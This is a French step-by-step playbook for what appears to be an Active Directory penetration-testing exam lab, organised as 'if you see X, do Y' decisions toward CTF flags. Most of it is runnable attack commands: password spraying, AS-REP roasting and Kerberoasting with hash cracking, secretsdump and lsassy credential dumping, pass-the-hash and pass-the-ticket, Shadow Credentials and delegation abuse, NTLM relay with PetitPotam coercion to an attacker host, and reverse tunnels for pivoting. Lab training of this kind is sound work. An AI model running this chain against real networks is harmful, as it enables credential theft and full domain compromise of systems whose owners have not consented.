# Marche à suivre — Examen Celestina AD

Guide décisionnel : chaque commande est suivie de **« si vous voyez X → faites Y »**. Utilisable sans Claude.

**Convention** : chaque commande pipe vers `2>&1 | tee attempt<N>_<desc>.txt` (N incrémenté à chaque commande, descriptif court). Permet de rejouer toute l'attaque et de garder une trace pour le rapport.

---

## Variables à remplir au début de la session

```bash
# adapter ces valeurs au brief de l'examen (peuvent différer du TP blanc)
export DC_IP="10.13.37.42"
export DC_HOST="dc-celestina"
export DOMAIN="celestina.shop"
export SUBNET="10.13.37.0/24"
export USER="pentester"
export PASS='Password123!'
export WORDLIST="/usr/share/wordlists/rockyou.txt"
export WORK="/workspace"
cd "$WORK"
mkdir -p bh loot
```

---

## Phase 0 — Préparation (Exegol container, VPN déjà actif)

### 0.1 Vérifier le routage
```bash
ip route 2>&1 | tee attempt1_route.txt
ping -c 2 "$DC_IP" 2>&1 | tee attempt2_ping_dc.txt
```
- ✅ route + ping OK → continuer
- ❌ pas de route → VPN tombé, relancer le tunnel
- ❌ ping fail mais route OK → ICMP filtré, ce n'est pas grave, continuer

### 0.2 Configurer DNS pour Kerberos
```bash
echo "$DC_IP $DC_HOST.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts
echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf
nslookup "$DC_HOST.$DOMAIN" 2>&1 | tee attempt3_dns.txt
```
- ✅ résolution → `$DC_IP` → OK
- ❌ NXDOMAIN → vérifier `/etc/resolv.conf`, parfois écrasé par le container

### 0.3 Valider les credentials initiaux
```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" 2>&1 | tee attempt4_validate_creds.txt
```
- ✅ `[+] $DOMAIN\$USER:$PASS` → continuer en Phase 1
- ❌ `STATUS_LOGON_FAILURE` → vérifier le brief, mauvais mot de passe
- ❌ timeout → vérifier VPN/route

---

## Phase 1 — Reconnaissance réseau

### 1.1 Sweep SMB du sous-réseau
```bash
nxc smb "$SUBNET" -u "$USER" -p "$PASS" 2>&1 | tee attempt5_smb_sweep.txt
```
- ✅ liste de machines `(Pwn3d!)` ou `[+]` → noter chaque hôte
- 👀 **chercher `(Pwn3d!)`** : si présent dès la phase 1, `$USER` est déjà admin local → bonus, aller direct en Phase 6 sur cette machine
- 👀 **noter les noms d'hôtes** (WK-XXX, serveurs, etc.) → futurs targets.txt FQDN

### 1.2 Audit RDP (→ Flag « RDP non-nécessaire »)
```bash
nxc rdp "$SUBNET" -u "$USER" -p "$PASS" 2>&1 | tee attempt6_rdp_audit.txt
```
- 👀 si **toutes** les machines acceptent RDP avec `$USER` → **Flag « RDP non-nécessaire »** validé. Documenter la liste.

### 1.3 WinRM + LDAP (couverture protocole)
```bash
nxc winrm "$SUBNET" -u "$USER" -p "$PASS" 2>&1 | tee attempt7_winrm_sweep.txt
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" 2>&1 | tee attempt8_ldap_check.txt
```
- 👀 WinRM ouvert sur une machine = canal d'exécution alternatif (utile plus tard)

---

## Phase 2 — Énumération des partages

### 2.1 Partages du DC
```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" --shares 2>&1 | tee attempt9_dc_shares.txt
```
- ✅ on attend `SYSVOL`, `NETLOGON`, `IPC$`, et **possiblement** d'autres
- 👀 **tout partage non-standard sur le DC** → suspect, à fouiller

### 2.2 Partages des workstations
```bash
for ip in $(cut -d' ' -f1 attempt5_smb_sweep.txt | grep -oE "$SUBNET_PREFIX[0-9]+" | sort -u); do
  echo "=== $ip ===" >> attempt10_wk_shares.txt
  nxc smb "$ip" -u "$USER" -p "$PASS" --shares 2>&1 >> attempt10_wk_shares.txt
done
# ou plus simple :
nxc smb "$SUBNET" -u "$USER" -p "$PASS" --shares 2>&1 | tee attempt10_wk_shares.txt
```
- 👀 **chercher partages non-standard** : `HUB`, `Todo`, `Backup`, `Share`, `Public`, `Deploy`, `IT`, etc.
- 👀 noter chaque machine + nom de partage non-standard

### 2.3 Fouille des partages intéressants
Pour chaque partage non-standard trouvé :
```bash
smbclient "//<IP>/<SHARE>" -U "$USER%$PASS" -c 'recurse; ls' 2>&1 | tee attempt11_<share>_listing.txt
```
- ✅ liste de fichiers → identifier `.pdf`, `.docx`, `.xlsx`, `.txt`, `.xml`, `.kdbx`, `.config`, `.bat`, `.ps1`, `.zip`
- 👀 récupérer les fichiers intéressants :
```bash
smbclient "//<IP>/<SHARE>" -U "$USER%$PASS" -c 'get <FICHIER>' 2>&1 | tee attempt12_get_<fichier>.txt
```

### 2.4 Extraction de mots de passe dans les fichiers (→ Flag « Goût par défaut »)
```bash
# PDF
strings <FICHIER>.pdf 2>&1 | tee attempt13_pdf_strings.txt | grep -iE 'password|pass|pwd|mdp|default|admin|user|compte|flag|key|secret'
pdftotext <FICHIER>.pdf - 2>&1 | tee attempt14_pdf_text.txt
# Office (docx/xlsx = zip)
unzip -p <FICHIER>.docx word/document.xml 2>&1 | tee attempt15_docx_xml.txt
# Tout fichier
grep -aiE 'password|pass|pwd|default|C3L|Welcome|temp[0-9]|Init[0-9]' <FICHIER> 2>&1 | tee attempt16_grep_creds.txt
```
- ✅ mot de passe trouvé → **Flag « Goût par défaut »** acquis (à valider par spray en Phase 5.1)
- ❌ rien → essayer un autre partage, ou `exiftool`/`binwalk` sur les fichiers

### 2.5 Module spider_plus (alternative)
```bash
nxc smb <IP> -u "$USER" -p "$PASS" -M spider_plus --share <SHARE> 2>&1 | tee attempt17_spider.txt
```

---

## Phase 3 — Énumération utilisateurs

### 3.1 RID brute force → users.txt
```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" --rid-brute 2>&1 | tee attempt18_rid_brute.txt
grep SidTypeUser attempt18_rid_brute.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt
wc -l users.txt 2>&1 | tee attempt19_users_count.txt
```
- ✅ ~50-100 utilisateurs → bon, continuer
- ❌ 0 utilisateurs → essayer LDAP (3.2)

### 3.2 Fallback LDAP si RID brute échoue
```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --users 2>&1 | tee attempt20_ldap_users.txt
grep -oP '^[A-Za-z0-9._-]+' attempt20_ldap_users.txt | sort -u > users.txt
```

---

## Phase 4 — BloodHound (CLI, sans GUI)

### 4.1 Collecte
```bash
cd "$WORK/bh"
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c All 2>&1 | tee ../attempt21_bh_collect.txt
ls *.json
```
- ✅ 5-7 fichiers JSON (`*_users.json`, `*_computers.json`, `*_groups.json`, `*_domains.json`, etc.) → **Flag « Promener le chien »** acquis
- ❌ erreur DNS → revenir Phase 0.2
- ❌ erreur LDAP → vérifier `$USER:$PASS` toujours valides

### 4.2 Mines à exploiter (greps successifs)

**a) Descriptions LDAP (mots de passe en clair) → Flag « Décrivez précisément »**
```bash
grep -i '"description"' *users*.json 2>&1 | grep -v '""' | tee ../attempt22_descriptions.txt
```
- ✅ lignes avec un texte qui ressemble à un mot de passe (`R3m0t3...`, `P4ssW0rd...`, `Welcome...`) → noter `sAMAccountName` voisin + le mot de passe
- 👉 valider chaque pair en Phase 5.2

**b) AddKeyCredentialLink (shadow credentials)**
```bash
grep -i -C 20 "AddKeyCredentialLink" *.json 2>&1 | tee ../attempt23_shadow_acls.txt
```
- ✅ paire `<contrôleur> → <victime>` trouvée → continuer Phase 7 (Shadow Credentials)

**c) Délégations**
```bash
grep -i -C 15 "AllowedToDelegate\|allowedtodelegate" *.json 2>&1 | tee ../attempt24_delegation_constrained.txt
grep -i "TrustedToAuth\|trustedfordelegation" *.json 2>&1 | tee ../attempt25_delegation_unconstrained.txt
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --trusted-for-delegation 2>&1 | tee ../attempt26_nxc_unconstrained.txt
```
- ✅ `allowedtodelegate: ["HTTP/WK-XXX..."]` → noter principal + SPN → Phase 8 (Constrained S4U)
- ✅ `TrustedForDelegation: true` sur une machine → Phase 8 (Unconstrained, plus complexe)

**d) ACLs dangereuses**
```bash
grep -i -C 10 "GenericAll\|GenericWrite\|WriteOwner\|WriteDacl\|ForceChangePassword" *.json 2>&1 | tee ../attempt27_dangerous_acls.txt
```
- ✅ chemin d'escalade → noter pour exploitation manuelle

**e) Utilisateurs intéressants**
```bash
grep -i '"hasspn": true' *users*.json 2>&1 | tee ../attempt28_spns.txt
grep -i '"dontreqpreauth": true' *users*.json 2>&1 | tee ../attempt29_asreproastable.txt
grep -i '"admincount": true' *users*.json 2>&1 | tee ../attempt30_admincount.txt
```

**f) Helper script**
```bash
bash "$WORK/cyber_forensic/scripts/grep-bh-rights.sh" 2>&1 | tee ../attempt31_bh_helper.txt
```

---

## Phase 5 — Kerberos roasting

### 5.1 AS-REP Roasting → Flag « Café pas sécurisé »
```bash
cd "$WORK"
GetNPUsers.py "$DOMAIN/$USER:$PASS" -request -format hashcat -dc-ip "$DC_IP" -outputfile asrep.txt 2>&1 | tee attempt32_asrep_request.txt
cat asrep.txt
```
- ✅ une ou plusieurs lignes `$krb5asrep$23$...` → continuer
- ❌ fichier vide → personne n'a `DONT_REQ_PREAUTH`, passer Kerberoast (5.2)

```bash
hashcat -m 18200 asrep.txt "$WORDLIST" --force 2>&1 | tee attempt33_asrep_crack.txt
hashcat -m 18200 asrep.txt --show 2>&1 | tee attempt34_asrep_show.txt
```
- ✅ `user@DOMAIN:password` → **Flag acquis**, valider :
```bash
nxc smb "$SUBNET" -u "<USER_CRAQUE>" -p "<PASS_CRAQUE>" --continue-on-success 2>&1 | tee attempt35_validate_asrep.txt
```
- ❌ rien craqué → essayer avec règles : `-r /usr/share/hashcat/rules/best64.rule`

### 5.2 Kerberoasting → Flag « CAAS »
```bash
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -request -dc-ip "$DC_IP" -outputfile kerb.txt 2>&1 | tee attempt36_kerb_request.txt
cat kerb.txt
hashcat -m 13100 kerb.txt "$WORDLIST" --force 2>&1 | tee attempt37_kerb_crack.txt
hashcat -m 13100 kerb.txt --show 2>&1 | tee attempt38_kerb_show.txt
```
- ✅ `user@DOMAIN:password` → **Flag acquis**, valider :
```bash
nxc smb "$SUBNET" -u "<USER>" -p "<PASS>" --continue-on-success 2>&1 | tee attempt39_validate_kerb.txt
```
- ❌ aucun craqué → certains comptes kerberoastables ont des mots de passe **pas dans rockyou** ; leur mot de passe est peut-être dans une **description LDAP** (cf 4.2.a)

### 5.3 Script combo
```bash
bash "$WORK/cyber_forensic/scripts/roast-and-crack.sh" 2>&1 | tee attempt40_roast_combo.txt
```

---

## Phase 6 — Mining + spray

### 6.1 Spray du mot de passe par défaut (de Phase 2.4) → Flag « Goût par défaut »
```bash
DEFAULT_PASS="<MOT_DE_PASSE_TROUVE_EN_2.4>"
nxc smb "$SUBNET" -u users.txt -p "$DEFAULT_PASS" --continue-on-success 2>&1 | tee attempt41_spray_default.txt
```
- ✅ une ou plusieurs lignes `[+]` → notez **chaque** user valide
- ✅ ligne `(Pwn3d!)` → **admin local trouvé, point d'entrée latéral** → Phase 7
- 👀 répéter pour chaque mot de passe craqué/trouvé :
```bash
nxc smb "$SUBNET" -u users.txt -p "<AUTRE_PASS>" --continue-on-success 2>&1 | tee attempt42_spray_<desc>.txt
```

### 6.2 Validation des descriptions LDAP → Flag « Décrivez précisément »
Pour chaque pair `(user, password)` trouvé en 4.2.a :
```bash
nxc smb "$SUBNET" -u "<USER>" -p "<PASS_FROM_DESC>" --continue-on-success 2>&1 | tee attempt43_validate_desc_<user>.txt
```
- ✅ `[+]` → **Flag « Décrivez précisément » acquis**, noter chaque pair

### 6.3 GPP / SYSVOL → Flag « Secret trop partagé »
```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_password 2>&1 | tee attempt44_gpp_password.txt
```
- ✅ `cpassword` trouvé → décrypter :
```bash
gpp-decrypt '<CPASSWORD_VALUE>' 2>&1 | tee attempt45_gpp_decrypt.txt
```
- ❌ rien → fouille manuelle de SYSVOL :
```bash
smbclient "//$DC_IP/SYSVOL" -U "$USER%$PASS" -c 'recurse; ls' 2>&1 | tee attempt46_sysvol_listing.txt
grep -iE 'cpassword|Groups\.xml|Services\.xml|ScheduledTasks\.xml|Drives\.xml' attempt46_sysvol_listing.txt
```

### 6.4 LDAP directement (alternative pour descriptions)
```bash
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" "(objectClass=user)" sAMAccountName description \
  2>&1 | tee attempt47_ldap_descriptions.txt
```

---

## Phase 7 — Mouvement latéral

### Pré-requis : avoir au moins un user `(Pwn3d!)` sur une machine (Phase 6.1 ou 1.1)

### 7.1 Dump des secrets → Flag « Passe moi le sel »
```bash
ADMIN_USER="<USER_PWND>"
ADMIN_PASS="<PASS>"
TARGET_IP="<IP_PWND>"
secretsdump.py "$DOMAIN/$ADMIN_USER:$ADMIN_PASS@$TARGET_IP" 2>&1 | tee attempt48_secretsdump.txt
```
- ✅ ligne `Administrator:500:aad3b...:<32-HEX>:::` → **NT hash local admin** acquis → noter
- ❌ `STATUS_ACCESS_DENIED` → user n'est pas admin local, retour Phase 6.1
- 👀 noter aussi les hashes utilisateurs DOMAIN et les LSA secrets s'il y en a

### 7.2 Pass-The-Hash mass test
```bash
NT_HASH="<NT_HEX>"
nxc smb "$SUBNET" -u Administrator -H "$NT_HASH" --local-auth 2>&1 | tee attempt49_pth_mass.txt
```
- ✅ `(Pwn3d!)` sur plusieurs machines → réutilisation de mot de passe local admin → **Flag « Passe moi le sel »** acquis, large compromise
- ❌ une seule `(Pwn3d!)`, le reste en `STATUS_LOGON_FAILURE` → LAPS activé, chaque machine a son hash unique

### 7.3 Récupérer ipconfig pour pivot
```bash
nxc smb "$SUBNET" -u Administrator -H "$NT_HASH" --local-auth -x 'ipconfig' 2>&1 | tee attempt50_ipconfig_scan.txt
grep -E '10\.|192\.|172\.|IPv4' attempt50_ipconfig_scan.txt
```
- ✅ une machine montre **deux interfaces** → réseau caché trouvé → Phase 9
- ❌ une seule interface partout → pas de pivot dual-homed visible (pour l'instant)

### 7.4 lsassy (extraction tickets Kerberos en mémoire) → Flag « Caché dans le secret LSA »
```bash
nxc smb "$TARGET_IP" -u "$ADMIN_USER" -p "$ADMIN_PASS" -M lsassy 2>&1 | tee attempt51_lsassy.txt
# ou avec le hash :
nxc smb "$TARGET_IP" -u Administrator -H "$NT_HASH" --local-auth -M lsassy 2>&1 | tee attempt52_lsassy_pth.txt
ls -lh /root/.nxc/modules/lsassy/ 2>&1 | tee attempt53_tickets_list.txt
```
- ✅ fichiers `.ccache` créés → tickets disponibles
- 👀 chercher `flag*:CCHDFLM{...}` dans la sortie → **Flag « Caché dans le secret LSA »** acquis
- ❌ rien (Defender / PPL) → fallback `secretsdump.py` ou `-M lsassy -o METHOD=comsvcs`

### 7.5 Pass-The-Ticket → Flag « Cible acquise KRB »
```bash
# choisir le ticket le plus utile
ls /root/.nxc/modules/lsassy/
TGT_FILE="/root/.nxc/modules/lsassy/<TICKET>.ccache"
export KRB5CCNAME="$TGT_FILE"
klist 2>&1 | tee attempt54_klist.txt

# générer targets FQDN (nxc -k refuse les IPs)
bash "$WORK/cyber_forensic/scripts/gen-targets-fqdn.sh" "$WORK/targets.txt" 2>&1 | tee attempt55_gen_targets.txt
cat "$WORK/targets.txt"

TGT_USER="<USER_DU_TICKET>"
nxc smb "$WORK/targets.txt" -u "$TGT_USER" -k -d "$DOMAIN" --use-kcache 2>&1 | tee attempt56_ptt.txt
```
- ✅ plusieurs `[+]` → **PtT fonctionne → Flag « Cible acquise KRB » acquis**
- ❌ `KRB_AP_ERR_*` → vérifier DNS, vérifier que cible est en FQDN, vérifier expiration ticket avec `klist`

---

## Phase 8 — AD avancé

### 8.1 Shadow Credentials → Flag « Je vis dans l'ombre »
Pré-requis : Phase 4.2.b a révélé `<CTRL> AddKeyCredentialLink <VICTIME>`.

```bash
CTRL_USER="<CONTROLEUR>"
CTRL_PASS="<MDP_CTRL>"   # ou hash en hexa avec -hashes :<NT>
VICTIM="<VICTIME>"

certipy-ad shadow auto \
  -u "$CTRL_USER@$DOMAIN" -p "$CTRL_PASS" \
  -account "$VICTIM" \
  -target "$DC_HOST.$DOMAIN" \
  2>&1 | tee attempt57_shadow.txt
```
- ✅ ligne `[*] NT hash for '$VICTIM': <32-HEX>` → **Flag acquis**, noter le hash
- ❌ `KDC has no support for PKINIT` → CA absente, méthode non applicable
- ❌ DNS errors → utiliser FQDN strict pour `-target`

Utiliser le hash :
```bash
VICTIM_HASH="<NT>"
nxc smb "$SUBNET" -u "$VICTIM" -H "$VICTIM_HASH" 2>&1 | tee attempt58_shadow_pth.txt
nxc smb "$SUBNET" -u "$VICTIM" -H "$VICTIM_HASH" -x 'ipconfig' 2>&1 | tee attempt59_shadow_ipconfig.txt
secretsdump.py "$DOMAIN/$VICTIM@<IP_PWND>" -hashes ":$VICTIM_HASH" 2>&1 | tee attempt60_shadow_sd.txt
```

### 8.2 Constrained Delegation (S4U) → Flag « Libéré, délivré, non contraint »
Pré-requis : Phase 4.2.c a révélé `<PRINCIPAL> allowedtodelegate ["<SPN>"]`.

```bash
PRINCIPAL="<PRINCIPAL>"
PRINCIPAL_PASS="<MDP>"
SPN_TARGET="<SPN_EXACT_DU_GREP>"   # ex: HTTP/WK-XXX.celestina.shop
IMPERSONATE="Administrator"

getST.py -dc-ip "$DC_IP" \
  -spn "$SPN_TARGET" \
  -impersonate "$IMPERSONATE" \
  "$DOMAIN/$PRINCIPAL:$PRINCIPAL_PASS" \
  2>&1 | tee attempt61_s4u.txt
ls *.ccache
```
- ✅ `$IMPERSONATE.ccache` créé → **Flag acquis**
- ❌ `KRB_AP_ERR_BADMATCH` → SPN incorrect, essayer variantes :
```bash
# remplacer HTTP par cifs / host / ldap sur le MÊME hostname :
TARGET_FQDN="<HOSTNAME>.celestina.shop"
getST.py -dc-ip "$DC_IP" -spn "cifs/$TARGET_FQDN" -impersonate "$IMPERSONATE" "$DOMAIN/$PRINCIPAL:$PRINCIPAL_PASS" 2>&1 | tee attempt62_s4u_cifs.txt
getST.py -dc-ip "$DC_IP" -spn "host/$TARGET_FQDN" -impersonate "$IMPERSONATE" "$DOMAIN/$PRINCIPAL:$PRINCIPAL_PASS" 2>&1 | tee attempt63_s4u_host.txt
```

Utiliser le ticket :
```bash
export KRB5CCNAME="$(pwd)/$IMPERSONATE.ccache"
klist 2>&1 | tee attempt64_klist_s4u.txt
nxc smb "$TARGET_FQDN" -u "$IMPERSONATE" -k --use-kcache 2>&1 | tee attempt65_s4u_use.txt
nxc smb "$TARGET_FQDN" -u "$IMPERSONATE" -k --use-kcache -x 'whoami /all' 2>&1 | tee attempt66_s4u_whoami.txt
nxc smb "$TARGET_FQDN" -u "$IMPERSONATE" -k --use-kcache -x 'ipconfig' 2>&1 | tee attempt67_s4u_ipconfig.txt
```
- 👀 si `ipconfig` montre IP d'un autre sous-réseau → Phase 9

### 8.3 Unconstrained Delegation (fallback si 8.2 ne s'applique pas)
```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --trusted-for-delegation 2>&1 | tee attempt68_ud_enum.txt
```
- ✅ machine listée → continuer
- Pour exploiter, il faut coercer une auth privilégiée :
```bash
# fenêtre 1 : relay
ntlmrelayx.py -t "ldap://$DC_HOST.$DOMAIN" --delegate-access 2>&1 | tee attempt69_relay.txt
# fenêtre 2 : coercition
python3 PetitPotam.py "$DC_IP" <ATTACKER_IP> 2>&1 | tee attempt70_petitpotam.txt
# ou : coercer.py / PrinterBug
```
- Puis dump :
```bash
nxc smb <UD_HOST> -u "<COMPROMISED>" -p "<PASS>" -M lsassy 2>&1 | tee attempt71_ud_lsassy.txt
```

---

## Phase 9 — Pivot vers sous-réseau caché

### 9.1 Identifier l'hôte dual-homed
Si Phase 7.3 ou 8.2 a montré une IP d'un autre range, noter :
```bash
HIDDEN_NET="<X.Y.Z.0/24>"   # le sous-réseau vu dans ipconfig
PIVOT_HOST="<IP_DUAL_HOMED_SUR_$SUBNET>"
```

### 9.2 Test de joignabilité directe
```bash
ping -c 1 "<IP_DANS_HIDDEN_NET>" 2>&1 | tee attempt72_ping_hidden.txt
nxc smb "$HIDDEN_NET" -u "$USER" -p "$PASS" 2>&1 | tee attempt73_hidden_smb.txt
```
- ✅ réponses → continuer en 9.4 directement
- ❌ pas de réponse → pivot requis (9.3)

### 9.3 Tunnel via l'hôte pivot (au choix)

**a) sshuttle (si SSH dispo sur pivot)**
```bash
sshuttle -r user@"$PIVOT_HOST" "$HIDDEN_NET" 2>&1 | tee attempt74_sshuttle.txt
```

**b) chisel + proxychains**
```bash
# attaquant :
./chisel server --reverse --port 8000 2>&1 | tee attempt75_chisel_srv.txt
# pivot (à exécuter sur la machine dual-homed) :
# chisel.exe client <ATTACKER_IP>:8000 R:1080:socks
# attaquant : éditer /etc/proxychains.conf -> socks5 127.0.0.1 1080
proxychains nxc smb "$HIDDEN_NET" -u "$USER" -p "$PASS" 2>&1 | tee attempt76_proxychains_smb.txt
```

**c) ligolo-ng (recommandé si dispo)**
```bash
./proxy -selfcert 2>&1 | tee attempt77_ligolo_proxy.txt
# sur le pivot : agent -connect <ATTACKER>:11601 -ignore-cert
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
# session interactive ligolo : start ; ifconfig ; route add ...
nxc smb "$HIDDEN_NET" -u "$USER" -p "$PASS" 2>&1 | tee attempt78_ligolo_smb.txt
```

### 9.4 Reprendre la chaîne d'attaque sur le réseau caché → Flag « Réseau non accessible »
```bash
# avec tous les creds collectés jusque-là, tester :
nxc smb "$HIDDEN_NET" -u "$USER" -p "$PASS" --continue-on-success 2>&1 | tee attempt79_hidden_sweep.txt
nxc smb "$HIDDEN_NET" -u "<USER_CRAQUE>" -p "<PASS>" --continue-on-success 2>&1 | tee attempt80_hidden_spray.txt
nxc smb "$HIDDEN_NET" -u "<USER>" -H "<NT>" 2>&1 | tee attempt81_hidden_pth.txt

# nouvelle collecte BH si un DC est dans le réseau caché :
mkdir -p "$WORK/bh-hidden" && cd "$WORK/bh-hidden"
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c All 2>&1 | tee ../attempt82_bh_hidden.txt
```
- ✅ machines + comptes nouveaux → **Flag « Réseau non accessible » acquis**, répéter Phases 1-8 sur le sous-réseau caché

---

## Phase 10 — Documentation & rapport

### 10.1 Mettre à jour le journal pour chaque flag
Éditer `exam-journal/JOURNAL_EXAMEN.md` avec, par flag :
```markdown
### Flag N — <intitulé>
- **Catégorie** : Network / Kerberos / Bonus
- **Technique** : <ex: AS-REP Roasting>
- **Pré-requis** : <ex: users.txt + creds pentester>
- **Commande clé** :
  ```bash
  <commande exacte>
  ```
- **Preuve** : voir `attempt<N>_<desc>.txt`
- **Secret obtenu** : <user/mdp/hash/ticket>
- **Impact** : <ex: admin local sur WK-XXX>
- **Heure** : HH:MM
```

### 10.2 Tableau de la chaîne de creds
Compléter `reference/creds-chain-template.md` au fur et à mesure.

### 10.3 Cocher la checklist
`EXAM-CHECKLIST.md` — cocher chaque flag obtenu.

### 10.4 Rendre le rapport final
Sections : synthèse, périmètre, méthodologie, findings (un par flag), chaîne de compromission, recommandations, annexes (`attempt*.txt`).

```bash
cd "$WORK/cyber_forensic/exam-journal"
pandoc JOURNAL_EXAMEN.md -o JOURNAL_EXAMEN.pdf 2>&1 | tee ../../attempt99_render.txt
pandoc RAPPORT-FINAL-TEMPLATE.md -o RAPPORT_FINAL.pdf
```

---

## Mémo des bascules « si je vois X → je fais Y »

| Observation | Action immédiate |
|---|---|
| `(Pwn3d!)` dans sweep SMB Phase 1 | secretsdump direct → Phase 7 |
| partage `HUB`/`Todo`/non-standard | spider + grep mdps Phase 2.4 |
| `description` LDAP avec texte qui ressemble à un mdp | valider avec nxc Phase 6.2 |
| `AddKeyCredentialLink` dans BH | Shadow Credentials Phase 8.1 |
| `allowedtodelegate` dans BH | S4U Phase 8.2 |
| `TrustedForDelegation` dans BH | Unconstrained Phase 8.3 |
| AS-REP/Kerberoast crackés | spray Phase 6 + lateral Phase 7 |
| ipconfig montre 2 IPs RFC1918 différentes | Pivot Phase 9 |
| NT hash local admin réutilisé sur autres WK | PTH mass + lsassy partout |
| `flag*:CCHDFLM{...}` dans une sortie | noter le flag, c'est la preuve |

---

## Erreurs fréquentes & fixes

| Erreur | Cause probable | Fix |
|---|---|---|
| `Name or service not known` | DNS non configuré | Phase 0.2 |
| `KRB_AP_ERR_SKEW` | décalage horaire | `sudo ntpdate $DC_IP` ou `sudo rdate -n $DC_IP` |
| `KRB_AP_ERR_BADMATCH` (getST/nxc -k) | SPN ou hostname incorrect | utiliser FQDN exact, varier cifs/HTTP/host |
| `STATUS_LOGON_FAILURE` après PTH | LAPS activé sur la cible | hash unique par machine, dump à nouveau |
| `lsassy` rend rien | Defender/PPL | `-o METHOD=comsvcs` ou `secretsdump.py` |
| `bloodhound-python` échoue résolution | DNS non pointé sur DC | Phase 0.2 |
| `hashcat` voit 0 hashes | retour à la ligne dans le fichier | chaque hash doit être sur une ligne unique |
| ticket expiré pour nxc -k | TGT > durée de vie | refaire lsassy / getST |

---

## Tableau récap flags (à compléter au fil de l'examen)

| # | Indice | Acquis | Fichier preuve | Technique |
|---|---|---|---|---|
| 1 | Le goût par défaut | ☐ | | mdp dans doc + spray |
| 2 | Décrivez précisément | ☐ | | description LDAP |
| 3 | Un secret trop partagé | ☐ | | GPP / SYSVOL |
| 4 | Café pas sécurisé | ☐ | | AS-REP roasting |
| 5 | CAAS | ☐ | | Kerberoasting |
| 6 | Passe moi le sel | ☐ | | secretsdump + PTH |
| 7 | Caché dans le secret LSA | ☐ | | lsassy |
| 8 | RDP non-nécessaire | ☐ | | nxc rdp audit |
| 9 | Je vis dans l'ombre | ☐ | | Shadow Credentials |
| 10 | Libéré, délivré, non contraint | ☐ | | Constrained delegation |
| 11 | Promener le chien | ☐ | | BloodHound collection |
| 12 | Cible acquise KRB | ☐ | | Pass-The-Ticket |
| 13 | Environnement changeant | ☐ | | BH différentiel |
| 14 | Réseau non accessible | ☐ | | Pivot dual-homed |

---

**Rappel** : chaque commande = `2>&1 | tee attempt<N>_<desc>.txt`. Numéroter monotoniquement. Le fichier `attempt*.txt` est la preuve à mettre en annexe du rapport.
